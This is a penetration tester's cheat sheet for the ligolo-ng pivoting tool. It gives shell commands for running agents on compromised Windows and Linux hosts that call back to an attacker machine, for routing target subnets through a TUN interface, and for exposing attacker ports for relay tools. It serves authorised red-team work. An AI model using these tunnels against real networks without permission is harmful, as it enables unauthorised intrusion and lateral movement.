# Ligolo

## ligolo

### Proxy server

Start the ligolo-ng proxy with a self-signed cert. Listens for agent callbacks on 11601.

```sh title:"Start ligolo-ng proxy with self-signed cert"
sudo ligolo-proxy -selfcert
```
<!-- cheat -->

### Windows agent

Run the ligolo agent on a Windows pivot host, ignoring the proxy's self-signed cert.

```sh title:"Run agent on Windows pivot, ignore self-signed cert"
.\agent.exe -ignore-cert -connect $lhost:11601
```
<!-- cheat
import tun_ip
-->

### Linux agent

Same callback from a Linux pivot host.

```sh title:"Run agent on Linux pivot, ignore self-signed cert"
./agent -ignore-cert -connect $lhost:11601
```
<!-- cheat
import tun_ip
-->

### Magic local route

Magic /32 route at 240.0.0.1 via the ligolo interface; lets the agent reach loopback ports on your attacker box (for ntlmrelayx, responder, etc.).

```sh title:"240.0.0.1/32 magic route, expose attacker loopback to agent"
sudo ip route add 240.0.0.1/32 dev ligolo
```
<!-- cheat -->

### Create tun interface

Create a TUN interface owned by your user named `ligolo`. One-time setup before bringing it up.

```sh title:"Create user-owned TUN interface named ligolo"
sudo ip tuntap add user $USER mode tun ligolo
```
<!-- cheat
import tun_ip
var USER
-->

### Bring tun up

Bring the ligolo TUN interface up. Required after creation and after reboots.

```sh title:"Bring ligolo TUN interface up"
sudo ip link set ligolo up
```
<!-- cheat -->

### Route subnet via tun

Route a target /24 through the ligolo tunnel so any tool on your box reaches it transparently.

```sh title:"Route target /24 through ligolo tunnel"
sudo ip route add $rhost_ip/24 dev ligolo
```
<!-- cheat
var rhost_ip
-->

### Default reverse listener

Default reverse port-forward inside the ligolo session. Exposes attacker 11601 on the pivot's 0.0.0.0:11601.

```sh title:"Default reverse forward, attacker:11601 onto pivot:11601"
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```
<!-- cheat -->

### Custom reverse listener

Custom reverse port-forward; pick the pivot bind port and the attacker-side destination.

```sh title:"Custom reverse forward, choose pivot port and attacker port"
listener_add --addr 0.0.0.0:$rport --to 127.0.0.1:$lport
```
<!-- cheat
import tun_ip
import lports
var rport
-->

